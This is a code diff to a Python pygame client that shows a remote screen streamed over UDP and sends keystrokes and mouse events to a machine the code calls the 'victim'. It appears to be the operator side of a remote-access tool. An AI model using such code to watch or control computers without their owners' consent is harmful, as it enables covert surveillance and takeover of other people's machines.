@@ -5,12 +5,18 @@ import keyboard
 import pygame
 from pygame.locals import *
 from tkinter import messagebox
+from io import BytesIO
+from PIL import Image
+import numpy as np
+from threading import Thread
 
 are_down = []
+buggy = [pygame.K_LSHIFT, pygame.K_LCTRL]
 
 
 class SocketData:
     s: socket.socket = None
+    screen_socket: socket.socket = None
     ip_of_server: tuple = ()
     ip_of_victim: tuple = ()
     want_to_leave: bool = False
@@ -85,19 +91,57 @@ class PygameScreen:
         pygame.init()
         self.screen = None
         self.is_pygame_screen_in_focus = False
+        self.running: bool = True
+        self.surface = None
+        self.surface_rect = None
+
+    def handle_screen_share_data(self):
+        while 1:
+            try:
+                while True:
+                    amount_of_packets = SocketData.screen_socket.recvfrom(2 ** 16)[0]
+                    if len(amount_of_packets) == 1:
+                        break
+                amount_of_packets = int.from_bytes(amount_of_packets, "big")
+                image_data = SocketData.screen_socket.recvfrom(2 ** 16)[0]
+                for i in range(amount_of_packets - 1):
+                    partial_data = SocketData.screen_socket.recvfrom(2 ** 16)[0]
+                    image_data += partial_data
+                with BytesIO(image_data) as stream:
+                    img = Image.open(stream)
+                    img = img.transpose(method=Image.FLIP_TOP_BOTTOM)
+                    r, g, b = img.split()
+                    img = Image.merge("RGB", (b, g, r))
+                    img_array = np.array(img)
+                    surface = pygame.surfarray.make_surface(img_array)
+                    surface = pygame.transform.rotate(surface, 90)
+                    surface = pygame.transform.flip(surface, False, True)
+                    surface = pygame.transform.scale(surface, (pygame.display.get_window_size()))
+                    surface_rect = surface.get_rect(center=self.screen.get_rect().center)
+                    print('got new image')
+                    self.screen.blit(surface, surface_rect)
+                    pygame.display.flip()
+            except Exception as e:
+                print(e)
 
     def run(self) -> None:
+        self.running = True
         self.is_pygame_screen_in_focus = False
         self.screen = pygame.display.set_mode((400, 400), RESIZABLE)
+        Thread(target=self.handle_screen_share_data, daemon=True).start()
         while 1:
             last_sent_mouse_id = 0
             for event in pygame.event.get():
                 match event.type:
                     case pygame.QUIT:
+                        # todo: send to the victim a leave packet
+                        pack_and_send(0xffff)
                         SocketData.ip_of_victim = ()
                         pygame.quit()
                         if self.is_pygame_screen_in_focus:
                             unhook_keys()
+                        self.running = False
+
                         return
                     case pygame.ACTIVEEVENT:
                         if bool(int(event.gain)):
@@ -111,11 +155,15 @@ class PygameScreen:
                         if str(event.key) not in are_down:
                             are_down.append(str(event.key))
                             pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
+
                     case pygame.KEYUP:
                         if str(event.key) in are_down:
                             are_down.remove(str(event.key))
-                            print(event.key)
                             pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
+                            if event in buggy:
+                                time.sleep(0.01)
+                                pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
+                                pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
                     case pygame.MOUSEBUTTONDOWN:
                         pack_and_send(generate_number_to_represent_mouse_event(event))
                     case pygame.MOUSEBUTTONUP:
@@ -125,7 +173,8 @@ class PygameScreen:
                     case pygame.MOUSEMOTION:
                         # 7 bits y 7 bits x 1 bit motion flag 1 bit mouse flag
                         current_mouse_id = 100 * pygame.mouse.get_pos()[1] // self.screen.get_size()[1] * 2 ** 9 \
-                                           + 100 * pygame.mouse.get_pos()[0] // self.screen.get_size()[0] * 2 ** 2 + 3
+                                           + 100 * pygame.mouse.get_pos()[0] // self.screen.get_size()[
+                                               0] * 2 ** 2 + 3
                         if current_mouse_id != last_sent_mouse_id:
                             pack_and_send(current_mouse_id)
                             last_sent_mouse_id = current_mouse_id
@@ -246,7 +295,7 @@ def get_virtual_code_of_event(event) -> int:  # return statements are virtual co
         case pygame.K_q:
             return 0x051
         case pygame.K_w:
-            return 0xe7
+            return 0x57
         case pygame.K_e:
             return 0x45
         case pygame.K_r:
@@ -349,5 +398,8 @@ def alt_pressed(event: pygame.event) -> None:
         pack_and_send(to_pack=0x12 * 4)
         are_down.append(event.name)
     elif event.name in are_down and event.event_type == 'up':
+        pack_and_send(to_pack=0x12 * 4 + 2)
+        time.sleep(0.01)
+        pack_and_send(to_pack=0x12 * 4)
         pack_and_send(to_pack=0x12 * 4 + 2)
         are_down.remove(event.name)
